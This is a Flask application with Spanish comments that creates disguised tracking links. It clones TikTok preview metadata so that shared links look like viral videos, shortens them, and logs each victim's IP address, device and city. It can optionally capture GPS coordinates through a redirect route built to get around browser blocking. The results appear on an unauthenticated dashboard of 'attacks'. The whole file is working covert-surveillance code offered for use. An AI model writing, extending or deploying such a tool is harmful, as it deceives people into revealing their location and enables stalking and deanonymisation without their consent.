import os
import random
import string
import requests
from bs4 import BeautifulSoup
from flask import Flask, request, jsonify, redirect, render_template
from datetime import datetime, timedelta
import psycopg2 

app = Flask(__name__)

DATABASE_URL = os.environ.get("DATABASE_URL")

# Configuración para engañar a TikTok y poder leer sus datos
HEADERS_FALSOS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept-Language': 'es-ES,es;q=0.9',
}

def get_db_connection():
    if not DATABASE_URL: return None
    conn = psycopg2.connect(DATABASE_URL)
    return conn

# --- CONFIGURACIÓN BASE DE DATOS ---
def inicializar_db():
    try:
        conn = get_db_connection()
        if conn is None: return
        cur = conn.cursor()
        
        # Tabla de Trampas (Links creados)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS trampas (
                id SERIAL PRIMARY KEY,
                token VARCHAR(50) UNIQUE NOT NULL,
                nombre VARCHAR(100),
                url_destino TEXT,
                meta_titulo TEXT, meta_desc TEXT, meta_img TEXT,
                usar_gps BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT NOW()
            );
        """)
        
        # Tabla de Intrusos (Víctimas)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS intrusos (
                id SERIAL PRIMARY KEY,
                trampa_id INTEGER REFERENCES trampas(id),
                ip_address VARCHAR(45),
                user_agent TEXT,
                city VARCHAR(100),
                lat TEXT, lon TEXT, accuracy TEXT,
                captured_at TIMESTAMP DEFAULT NOW()
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e: print(f"Error DB Init: {e}")

# --- RUTA DE MANTENIMIENTO (Por si faltan columnas) ---
@app.route('/update_db_schema')
def update_db_schema():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS usar_gps BOOLEAN DEFAULT FALSE;")
        cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS lat TEXT;")
        cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS lon TEXT;")
        cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS accuracy TEXT;")
        conn.commit()
        cur.close()
        conn.close()
        return "<h1>✅ Base de Datos Actualizada y Lista</h1>"
    except Exception as e: return f"❌ Error: {e}"

# --- HERRAMIENTAS ---
def generar_token():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

def obtener_ubicacion(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        data = response.json()
        if data['status'] == 'success': return f"{data['city']}, {data['country']}"
        else: return "Desconocida"
    except: return "Error Geo"

def acortar_link(url_larga):
    try:
        # Usamos is.gd
        api_url = f"https://is.gd/create.php?format=simple&url={url_larga}"
        response = requests.get(api_url, timeout=5)
        if response.status_code == 200: return response.text.strip()
        return url_larga
    except: return url_larga

def clonar_metadatos(url_destino):
    try:
        response = requests.get(url_destino, headers=HEADERS_FALSOS, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        t = soup.find("meta", property="og:title")
        d = soup.find("meta", property="og:description")
        i = soup.find("meta", property="og:image")
        
        t_f = t["content"] if t else "Video Viral"
        d_f = d["content"] if d else "Haz clic para ver"
        i_f = i["content"] if i else "https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95c4d0840c83a04.png"
        return t_f, d_f, i_f
    except: return "Video", "Ver video", ""

# --- RUTAS DE LA APP ---

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/api/crear_trampa', methods=['POST'])
def crear_trampa():
    data = request.json
    nombre = data.get('nombre', 'Trampa')
    url_destino = data.get('url_destino', '')
    usar_gps = data.get('usar_gps', False)
    
    # Clonado Automático si no hay datos manuales
    u_t = data.get('meta_titulo', '')
    u_d = data.get('meta_desc', '')
    
    if not u_t or not u_d:
        c_t, c_d, c_i = clonar_metadatos(url_destino)
        meta_titulo = u_t if u_t else c_t
        meta_desc = u_d if u_d else c_d
        meta_img = data.get('meta_img') if data.get('meta_img') else c_i
    else:
        meta_titulo, meta_desc = u_t, u_d
        meta_img = data.get('meta_img', '')

    token = generar_token()
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO trampas (token, nombre, url_destino, meta_titulo, meta_desc, meta_img, usar_gps) VALUES (%s, %s, %s, %s, %s, %s, %s)", 
        (token, nombre, url_destino, meta_titulo, meta_desc, meta_img, usar_gps)
    )
    conn.commit()
    cur.close()
    conn.close()
    
    link_final = acortar_link(f"{request.host_url}s/{token}")
    return jsonify({"status": "ok", "link": link_final})

# --- LA TRAMPA PRINCIPAL ---
@app.route('/s/<token>')
def trampa_activada(token):
    # 1. Captura IP y Ciudad
    ip_victima = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_victima and ',' in ip_victima: ip_victima = ip_victima.split(',')[0].strip()
    user_agent = request.headers.get('User-Agent')
    ubicacion = obtener_ubicacion(ip_victima)
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT id, url_destino, meta_titulo, meta_desc, meta_img, usar_gps FROM trampas WHERE token = %s", (token,))
    trampa = cur.fetchone()
    
    if not trampa: return redirect("https://google.com")
    
    trampa_id, url_final, m_t, m_d, m_i, usar_gps = trampa
    
    # Filtro de Bots (Para mostrar la tarjeta en WhatsApp)
    ua_str = str(user_agent).lower()
    es_bot = "facebook" in ua_str or "whatsapp" in ua_str or "telegram" in ua_str or "twitter" in ua_str
    
    if not es_bot:
        # Guardamos la visita inicial
        cur.execute("INSERT INTO intrusos (trampa_id, ip_address, user_agent, city) VALUES (%s, %s, %s, %s)", 
                   (trampa_id, ip_victima, user_agent, ubicacion))
        conn.commit()
    
    cur.close()
    conn.close()

    # Si es bot, devolvemos HTML falso con metadatos
    if es_bot:
        return f"""<!DOCTYPE html><html><head>
            <meta property="og:type" content="website">
            <meta property="og:site_name" content="TikTok">
            <meta property="og:title" content="{m_t}">
            <meta property="og:description" content="{m_d}">
            <meta property="og:image" content="{m_i}">
            <meta name="twitter:card" content="summary_large_image">
        </head><body></body></html>"""

    # Si es humano y pedimos GPS, mostramos pantalla de carga
    if usar_gps:
        return render_template('tracker.html')
    else:
        # Si no pedimos GPS, vamos directo al video
        return redirect(url_final)

# --- NUEVA RUTA: REBOTE GPS (Para esquivar bloqueo de Brave) ---
@app.route('/api/save_gps_bounce', methods=['GET'])
def save_gps_bounce():
    token = request.args.get('token')
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    acc = request.args.get('acc')
    
    conn = get_db_connection()
    cur = conn.cursor()
    
    # Buscamos a dónde hay que redirigir
    cur.execute("SELECT id, url_destino FROM trampas WHERE token = %s", (token,))
    res = cur.fetchone()
    
    url_final = "https://tiktok.com"
    
    if res:
        trampa_id = res[0]
        url_final = res[1]
        
        # Actualizamos el último registro con el GPS real
        cur.execute("""
            UPDATE intrusos SET lat = %s, lon = %s, accuracy = %s 
            WHERE trampa_id = %s 
            AND id = (SELECT MAX(id) FROM intrusos WHERE trampa_id = %s)
        """, (lat, lon, acc, trampa_id, trampa_id))
        conn.commit()
        
    cur.close()
    conn.close()
    
    # Redirigimos al usuario al video final
    return redirect(url_final)

# --- RUTA DE REDIRECCIÓN SIMPLE (Fallback) ---
@app.route('/redirect/<token>')
def redirect_final(token):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT url_destino FROM trampas WHERE token = %s", (token,))
    res = cur.fetchone()
    cur.close()
    conn.close()
    return redirect(res[0] if res else "https://tiktok.com")

# --- API PARA TU DASHBOARD EN IPHONE ---
@app.route('/api/ver_ataques', methods=['GET'])
def ver_ataques():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("""
        SELECT t.nombre, i.ip_address, i.captured_at, i.user_agent, i.city, i.lat, i.lon
        FROM intrusos i JOIN trampas t ON i.trampa_id = t.id
        ORDER BY i.captured_at DESC LIMIT 20
    """)
    ataques = cur.fetchall()
    cur.close()
    conn.close()
    
    resultado = []
    for a in ataques:
        hora_ecu = a[2] - timedelta(hours=5)
        resultado.append({
            "trampa": a[0], "ip": a[1], "hora": hora_ecu.strftime("%Y-%m-%d %H:%M:%S"),
            "dispositivo": a[3], "ubicacion": a[4] if a[4] else "Desconocida",
            "lat": a[5], "lon": a[6]
        })
    return jsonify(resultado)

inicializar_db()

if __name__ == '__main__':
    app.run(debug=True, port=5000)